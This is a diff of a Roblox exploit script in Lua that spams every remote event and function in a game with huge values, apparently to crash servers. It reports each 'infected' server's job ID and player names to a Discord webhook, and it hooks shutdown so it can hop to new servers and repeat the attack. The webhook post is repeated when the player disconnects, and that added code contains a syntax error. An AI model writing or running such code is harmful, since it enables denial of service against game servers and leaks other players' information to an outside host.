@@ -33,55 +33,7 @@ local MMAX = math.random(min, max)
 --local max = math.random(10, 19)
 local settings = 4 -- best
 
-
-for i = 1, 5 do
-    -- Start
-    for p, v in pairs(game:GetDescendants()) do
-        coroutine.wrap(function()
-            local success, err = pcall(function()
-                if v:IsA("RemoteFunction") then
-                    v:InvokeServer(math.huge)
-                elseif v:IsA("RemoteEvent") then
-                    v:FireServer(math.huge)
-                elseif v:IsA("BindableEvent") and v ~= Players.LocalPlayer.PlayerGui.Intro.LocalScript:FindFirstChild("DoTutorial") then
-                    v:Fire(game.Players.LocalPlayer, math.huge)
-                end
-            end)
-            if not success then
-                warn(":neutral-face: " .. err)
-            end
-        end)()
-    end
-end
-    
-    task.wait(settings)
-    coroutine.wrap(function()
-        local HttpService = game:GetService("HttpService")
-        local players = {}
-    
-        for _, player in ipairs(game.Players:GetPlayers()) do
-            table.insert(players, player.Name)
-        end
-    
-        local content = "🚨 SERVER INFECTED 🚨\n"
-        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
-        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
-        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
-    
-        http.request({
-            Url = "https://discord.com/api/webhooks/1539253154519056496/1cKfkl5oDiqIeue7J5waVY20z6MpvVjle3d0QiaJbS-7YivEzNUN9sKqYEahbVi5nUwd",
-            Method = "POST",
-            Headers = {
-                ["Content-Type"] = "application/json"
-            },
-            Body = HttpService:JSONEncode({
-                content = "@everyone " .. content,
-                username = game.Players.LocalPlayer.Name or "Crash Logger"
-            })
-        })
-    end)()
-    
-    local function HOPPING()
+local function HOPPING()
     if httprequest then
         local servers = {}
         local cursor = nil
@@ -131,5 +83,77 @@ end
     end
 end
 
+for i = 1, 5 do
+    -- Start
+    for p, v in pairs(game:GetDescendants()) do
+        coroutine.wrap(function()
+            local success, err = pcall(function()
+                if v:IsA("RemoteFunction") then
+                    v:InvokeServer(math.huge)
+                elseif v:IsA("RemoteEvent") then
+                    v:FireServer(math.huge)
+                elseif v:IsA("BindableEvent") and v ~= Players.LocalPlayer.PlayerGui.Intro.LocalScript:FindFirstChild("DoTutorial") then
+                    v:Fire(game.Players.LocalPlayer, math.huge)
+                end
+            end)
+            if not success then
+                warn(":neutral-face: " .. err)
+            end
+        end)()
+    end
+end
+    
+    task.wait(settings)
+    coroutine.wrap(function()
+        local HttpService = game:GetService("HttpService")
+        local players = {}
+    
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            table.insert(players, player.Name)
+        end
+    
+        local content = "🚨 SERVER INFECTED 🚨\n"
+        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
+        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
+        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
+    
+        http.request({
+            Url = "https://discord.com/api/webhooks/1539253154519056496/1cKfkl5oDiqIeue7J5waVY20z6MpvVjle3d0QiaJbS-7YivEzNUN9sKqYEahbVi5nUwd",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "@everyone " .. content,
+                username = game.Players.LocalPlayer.Name or "Crash Logger"
+            })
+        })
+    end)()
+
+coroutine.wrap(function()
+HOPPING()
+end)()
+
+local old
+old = hookfunction(game.Shutdown, function()
+ HOPPING()
+end)
+
+game.Players.PlayerRemoving:Connect(function(plr)
+if plr.Name = lp.Name then
+ http.request({
+            Url = "https://discord.com/api/webhooks/1539253154519056496/1cKfkl5oDiqIeue7J5waVY20z6MpvVjle3d0QiaJbS-7YivEzNUN9sKqYEahbVi5nUwd",
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "@everyone " .. content,
+                username = game.Players.LocalPlayer.Name .. " Disconnected Reconnecting..."
+            })
+        })
 
 HOPPING()
+end
+end)
+
